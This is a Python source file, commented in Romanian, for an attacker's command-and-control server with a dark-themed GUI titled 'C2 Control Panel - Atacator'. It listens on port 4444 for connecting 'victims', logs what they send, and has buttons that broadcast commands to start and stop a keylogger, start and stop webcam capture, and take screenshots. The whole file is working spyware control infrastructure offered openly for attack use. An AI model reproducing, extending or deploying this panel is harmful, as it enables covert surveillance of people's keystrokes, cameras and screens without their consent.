import socket
import threading
import customtkinter as ctk
from datetime import datetime
import os

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class C2Server:
    def __init__(self):
        self.host = "0.0.0.0"      # Ascultă pe toate interfețele
        self.port = 4444           # Schimbă dacă vrei alt port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}          # {client_socket: "IP"}

    def handle_client(self, client_socket, address):
        print(f"[+] Victimă conectată: {address[0]}")
        self.clients[client_socket] = address[0]

        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if data:
                    print(f"[{address[0]}] {data}")
            except:
                print(f"[-] Victimă deconectată: {address[0]}")
                del self.clients[client_socket]
                client_socket.close()
                break

    def start_server(self):
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[+] C2 Server pornit pe port {self.port}")

        while True:
            client, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(client, addr))
            thread.daemon = True
            thread.start()

    def send_command(self, command):
        if not self.clients:
            print("[-] Nu există victime conectate!")
            return
        
        for client in list(self.clients.keys()):
            try:
                client.send(command.encode('utf-8'))
            except:
                client.close()
                del self.clients[client]

# ====================== GUI ======================
class C2GUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("C2 Control Panel - Atacator")
        self.geometry("600x500")
        
        self.c2 = C2Server()
        
        # Pornire server într-un thread
        threading.Thread(target=self.c2.start_server, daemon=True).start()

        self.create_widgets()

    def create_widgets(self):
        ctk.CTkLabel(self, text="C2 Control Panel", font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20)

        ctk.CTkLabel(self, text="Comenzi disponibile:", font=ctk.CTkFont(size=16)).pack(pady=10)

        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(pady=20, padx=40, fill="x")

        ctk.CTkButton(btn_frame, text="▶ Start Keylogger", height=50, fg_color="green", 
                      command=lambda: self.c2.send_command("START_KEYLOGGER")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="■ Stop Keylogger", height=50, fg_color="red", 
                      command=lambda: self.c2.send_command("STOP_KEYLOGGER")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Start Webcam Capture", height=50, fg_color="green", 
                      command=lambda: self.c2.send_command("START_CAMERA")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Stop Webcam Capture", height=50, fg_color="red", 
                      command=lambda: self.c2.send_command("STOP_CAMERA")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Send Screenshot", height=50, 
                      command=lambda: self.c2.send_command("TAKE_SCREENSHOT")).pack(pady=8, fill="x")

        self.status = ctk.CTkLabel(self, text="Server pornit | Aștept victime...", font=ctk.CTkFont(size=14))
        self.status.pack(pady=30)

if __name__ == "__main__":
    app = C2GUI()
    app.mainloop()